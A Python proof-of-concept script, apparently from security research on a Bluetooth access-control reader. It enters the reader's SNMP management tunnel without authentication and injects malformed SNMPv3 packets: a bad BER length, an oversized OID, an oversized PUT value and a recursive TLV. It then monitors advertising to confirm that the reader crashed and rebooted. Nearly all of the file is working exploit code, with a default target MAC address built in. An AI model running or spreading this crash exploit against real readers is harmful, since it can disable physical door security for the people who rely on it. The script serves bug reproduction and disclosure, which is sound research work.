#!/usr/bin/env python3
"""Repro of the reader reboot-on-malformed-SNMPv3 crash in the management tunnel
(PROTOCOL.md §37).

Engages the Artemis/SNMP tunnel the unauthenticated way (reply FCI_OK to the
OPERATION_SELECTOR AID), then on the reader's GET_DATA (0xCA) poll injects a
malformed SNMPv3 command. The reader re-offers the tunnel, then drops the link
(GATT disconnect) and reboots (goes dark ~50-90 s, then comes back healthy).

Cases:
  badber   GET with an invalid BER SEQUENCE length byte (~16 B)
  hugeoid  GET with a 200-byte OID (318 B total)
  puthuge  PUT_DATA with a 120-byte value
  recur    GET with a deeply recursive TLV

Usage:
  python3 tools/tunnel_crash.py <MAC> [case]     # case defaults to badber
"""
import argparse
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from hid_rm import DATA_CHAR_UUID, framing, seos, tunnel

MAC_DEFAULT = "C0:60:33:15:2B:31"
OPSEL = bytes.fromhex("a000000382002f000101")
FCI_OK = bytes.fromhex("6f0885060201400201009000")
SW_OK = bytes.fromhex("9000")
SW_NOT_FOUND = bytes.fromhex("6a82")


def build_cases() -> dict:
    return {
        "badber":  bytes([0x00, 0xCA, 0x00, 0x00]) + bytes([0x30, 0xFF]) + bytes(10),
        "hugeoid": tunnel.build_partial_read_get(bytes(200), offset=0, length=128),
        "puthuge": bytes([0x00, 0xDB, 0x00, 0x00]) + bytes(120),
        "recur":   bytes([0x00, 0xCA, 0x00, 0x00])
                   + bytes([0x30, 0x10] * 8),
    }


async def present(mac: str, timeout: float = 2.5) -> bool:
    from bleak import BleakScanner
    return mac in await BleakScanner.discover(timeout=timeout)


async def main(mac: str, case: str):
    from bleak import BleakClient
    sys.stdout.reconfigure(line_buffering=True)
    cases = build_cases()
    payload = cases.get(case, cases["badber"])
    print(f"== tunnel SNMPv3 crash repro: {mac} case={case} ==", flush=True)

    # wait for the reader to be up (it has a natural dark/up cycle, §36)
    print("   waiting for reader up ...", flush=True)
    for _ in range(60):
        if await present(mac):
            break
        await asyncio.sleep(3)
    if not await present(mac):
        print("   (reader never came up in time -- try again)", flush=True)
        return

    c = BleakClient(mac)
    rx = []
    ev = asyncio.Event()

    def on_n(_, d):
        rx.append(bytes(d)); ev.set()

    async def drain(t=2.0):
        try:
            await asyncio.wait_for(ev.wait(), timeout=t)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(0.05)
        f = list(rx); rx.clear(); ev.clear()
        return f

    async def send(body: bytes):
        for fr in framing.ble_fragment(body):
            await c.write_gatt_char(DATA_CHAR_UUID, fr, response=False)
            await asyncio.sleep(0.02)

    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, on_n)
    injected = False
    for _ in range(30):
        frags = await drain(2.0)
        if not c.is_connected:
            print("   [link down]", flush=True)
            break
        if not frags:
            continue
        body = framing.ble_reassemble(frags)
        if not body:
            continue
        ins = body[1] if len(body) > 1 else None
        if ins == 0xA4:  # SELECT
            aid = body[5:5 + body[4]] if len(body) >= 5 else b""
            print(f"   < SELECT {aid.hex()}", flush=True)
            await send(FCI_OK if aid == OPSEL else SW_NOT_FOUND)
            continue
        if ins == 0xCA and not injected:  # GET_DATA poll -> inject malformed SNMPv3
            print(f"   < GET_DATA poll; injecting {case} ({len(payload)} B)", flush=True)
            await send(payload)
            injected = True
            continue
        if ins == 0xDA:  # PUT_DATA (reader's reply / session setup)
            print("   < PUT_DATA (reply)", flush=True)
            await send(SW_OK)
            continue
        print(f"   < {frags[0].hex()}", flush=True)
    try:
        await c.disconnect()
    except Exception as e:
        print("   [disconnect]", type(e).__name__, e, flush=True)

    print("\n   [watch] advertising (reboot = a dark gap of ~50-90s):", flush=True)
    t0 = time.monotonic()
    first_dark = None
    while time.monotonic() - t0 < 90:
        if await present(mac):
            if first_dark is None:
                print("   -> STABLE (never dark this run)", flush=True)
            else:
                print(f"   -> REBOOT (dark {time.monotonic() - first_dark:.0f}s) -- reproduced", flush=True)
            return
        if first_dark is None and time.monotonic() - t0 >= 3:
            first_dark = time.monotonic()
        await asyncio.sleep(1)
    print("   -> still dark at 90s (reboot, or reader's natural dark cycle)", flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    ap.add_argument("case", nargs="?", default="badber",
                    choices=["badber", "hugeoid", "puthuge", "recur"])
    args = ap.parse_args()
    asyncio.run(main(args.mac, args.case))
